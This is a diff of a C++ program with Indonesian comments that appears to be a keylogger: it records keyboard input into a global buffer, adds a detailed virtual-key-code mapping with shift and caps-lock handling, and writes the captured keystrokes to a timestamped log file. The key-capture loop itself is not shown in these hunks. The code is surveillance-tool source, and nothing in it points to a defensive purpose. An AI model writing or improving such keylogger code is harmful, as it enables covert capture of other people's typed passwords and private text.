@@ -47,12 +47,11 @@
 using namespace std;
 
 /* ----------------------------------------
-* 	 VARIABEL GLOBAL
+* 				VARIABEL GLOBAL
 * ----------------------------------------*/
 
 // tempat menyimpan semua data rekaman keyboard
 string dataRekam = "";
-string tanggalWaktu;
 string filename;
 ofstream outfile;
 
@@ -63,8 +62,108 @@ ofstream outfile;
 * int i =0, j =1;
 * str
 ********* */
-//menuliskan data dari perekam ke file
-void TulisKeFile() {
+
+// mengembalikan bentuk karakter dari keyCode Keyboard
+string olahKarakter(int kode, bool biasa){
+	string keluar = "";
+	switch(kode){
+		case 0x08: return "(BACKSPACE)";
+		case 0x03: return "(BREAK)";
+		case 0x1B: return "(ESCAPE)";
+		case 0x0D: return "(ENTER)";
+		case 0x20: return " ";
+		case 0x09: return "(TAB)";
+		case 0x2E: return "(DELETE)";
+		case 0x28: return "(BAWAH)";
+		case 0x27: return "(KANAN)";
+		case 0x26: return "(ATAS)";
+		case 0x25: return "(KIRI)";
+		case 0x70: return "F1";
+		case 0x71: return "F2";
+		case 0x72: return "F3";
+		case 0x73: return "F4";
+		case 0x74: return "F5";
+		case 0x75: return "F6";
+		case 0x76: return "F7";
+		case 0x77: return "F8";
+		case 0x78: return "F9";
+		case 0x79: return "F10";
+		case 0x7A: return "F11";
+		case 0x7B: return "F12";
+		case 0x24: return "(HOME)";
+		case 0x23: return "(END)";
+		case 0x22: return "(PAGE DOWN)";
+		case 0x21: return "(PAGE UP)";
+		case 0x91: return "(SCROLL LOCK)";
+		case 0x2C: return "(PRINT SCREEN)";
+		default: ;
+	}
+	if(biasa){
+		if(kode >= 0x30 && kode <= 0x39){
+			keluar += (char)kode;
+			return keluar;
+		}
+		if(kode >= 0x41 && kode <= 0x5A){
+			keluar += (char) (kode + 0x20);
+			return keluar;
+		}
+		char ch;
+		switch(kode){
+			case 0xBA: ch = ';'; break;
+			case 0xBF: ch = '/'; break;
+			case 0xC0: ch = '`'; break;
+			case 0xDB: ch = '['; break;
+			case 0xDC: ch = '\\'; break;
+			case 0xDD: ch = ']'; break;
+			case 0xDE: ch = '\''; break;
+			case 0xBC: ch = ','; break;
+			case 0xBE: ch = '.'; break;
+			case 0xBD: ch = '-'; break;
+			case 0xBB: ch = '='; break;
+		}
+		keluar += ch;
+	}else{
+		if(kode >= 0x30 && kode <= 0x39){
+			char ch;
+			switch(kode){
+				case 0x31: ch = '!'; break;
+				case 0x32: ch = '@'; break;
+				case 0x33: ch = '#'; break;
+				case 0x34: ch = '$'; break;
+				case 0x35: ch = '%'; break;
+				case 0x36: ch = '^'; break;
+				case 0x37: ch = '&'; break;
+				case 0x38: ch = '*'; break;
+				case 0x39: ch = '('; break;
+				case 0x30: ch = ')'; break;
+			}
+			keluar += ch;
+			return keluar;
+		}
+		if(kode >= 0x41 && kode <= 0x5A){
+			keluar += (char) kode;
+			return keluar;
+		}
+		char ch;
+		switch(kode){
+			case 0xBA: ch = ':'; break;
+			case 0xBF: ch = '?'; break;
+			case 0xC0: ch = '~'; break;
+			case 0xDB: ch = '{'; break;
+			case 0xDC: ch = '|'; break;
+			case 0xDD: ch = '}'; break;
+			case 0xDE: ch = '"'; break;
+			case 0xBC: ch = '<'; break;
+			case 0xBE: ch = '>'; break;
+			case 0xBD: ch = '_'; break;
+			case 0xBB: ch = '+'; break;
+		}
+		keluar += ch;
+	}
+	return keluar;
+}
+
+void TulisKeFile(){
 	outfile.open(filename.c_str(), ios::out | ios::trunc);
 	if (!outfile) {
 		cerr << "Tidak bisa membuka file!" <<endl;
@@ -75,11 +174,6 @@ void TulisKeFile() {
 
 	// menutup berkas
 	outfile.close();
-}
-
-// mengembalikan bentuk karakter dari keyCode Keyboard
-char olahKarakter(int kode){
-	return (char) kode;
 }
 
 // mengembalikan true jika i adalah representasi kode dari Shift, Ctrl, atau Alt
@@ -127,12 +221,12 @@ void olahMasukan(int in, bool tCtrl, bool tAlt, bool tShift, bool tCapslock){
 		}
 	
 		// Mode Shift dan Capslock tidak aktif (huruf kecil)
-		if(!(tCapslock ^ tShift) && in > 64 && in < 91){
-			masukan += olahKarakter(in + 32);
+		if(!(tCapslock ^ tShift)){
+			masukan += olahKarakter(in, true);
 		}else{
 			
 			// Mode Shift atau Capslock aktif (huruf kapital)
-			masukan += olahKarakter(in);
+			masukan += olahKarakter(in, false);
 		}
 		masukan += (tCtrl || tAlt ? ")" : "");
 	
@@ -140,6 +234,7 @@ void olahMasukan(int in, bool tCtrl, bool tAlt, bool tShift, bool tCapslock){
 	
 		// menyimpan keluaran ke dalam string dataRekam;
 		dataRekam += masukan;
+		//cout << dataRekam << endl;
 	}
 
 
@@ -156,10 +251,10 @@ void mulaiRekam(){
         * exit(1);
 	* }
 	* -------------------------------- */
-        time_t now = time(0);
+    time_t now = time(0);
 	tm *ltm = localtime(&now);
 
-	
+	string tanggalWaktu;
 
 	//konversi dari integer ke string
 	stringstream syear, smon,sday,shour, smin,ssec;
@@ -224,12 +319,7 @@ void mulaiRekam(){
 	}
 	
 	// menulis rekaman/log
-	
-	/*--------------------------- 
-	* bukan standard cpp 
-	* fputs(dataRekam.c_str(), file); 
-	*--------------------------- */
-
+	TulisKeFile();
 }
 
 int main(){
